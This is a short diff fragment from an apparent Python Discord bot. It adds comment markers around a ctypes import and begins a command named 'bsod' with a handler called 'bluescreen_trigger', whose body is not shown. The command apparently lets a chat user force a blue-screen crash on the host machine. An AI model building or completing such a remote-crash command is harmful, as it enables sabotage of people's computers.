@@ -1,4 +1,6 @@
+#<imports>
 import ctypes
+#</imports>
 
 @client.command(name="bsod")
 async def bluescreen_trigger(ctx): 
